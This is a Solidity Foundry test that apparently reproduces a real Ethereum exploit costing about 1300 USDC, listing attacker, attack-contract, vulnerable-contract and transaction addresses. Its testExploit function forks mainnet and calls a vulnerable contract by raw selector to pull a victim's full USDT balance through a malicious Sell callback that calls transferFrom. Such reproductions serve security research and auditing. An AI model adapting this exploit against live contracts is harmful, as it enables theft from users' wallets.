// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~1300 $USDC
// Attacker : https://etherscan.io/address/0x015d0b51d0a65ad11cf4425de2ec86a7b320db3f
// Attack Contract : https://etherscan.io/address/0xfe2011dad32ad6dfd128e55490c0fd999f3d2221
// Vulnerable Contract : https://etherscan.io/address/0x76577603f99eae8320f70b410a350a83d744cb77
// Attack Tx : https://etherscan.io/tx/0x74279a131dccd6479378b3454ea189a6ce350cce51de47d81a0ef23db1b134d5

import "forge-std/Test.sol";
import "./../interface.sol";

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUSDTinterface {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

contract ContractTest is Test {
    IUSDTinterface USDT = IUSDTinterface(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address Contract_addr = 0x76577603F99EAe8320F70B410a350a83D744CB77;
    address Victim = 0x637b935CbA030Aeb876eae07Aa7FF637166de4D6;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_511_178 - 1);
        vm.label(address(USDT), "USDT");
        vm.label(address(Contract_addr), "Contract_addr");
        vm.label(address(Victim), "Victim");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
        uint256 Victim_balance = USDT.balanceOf(address(Victim));
        (bool success, bytes memory data) = Contract_addr.call(abi.encodeWithSelector(bytes4(0x0a8fe064), address(this), Victim, 0, Victim_balance, 1));
        emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
    }

    function Sell(uint256 _snipeID, uint256 _sellPercentage) payable external returns (bool){
        address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), Contract_addr, address(this), _snipeID));
        return false;
    }

    fallback() external payable {}
    receive() external payable {}
}
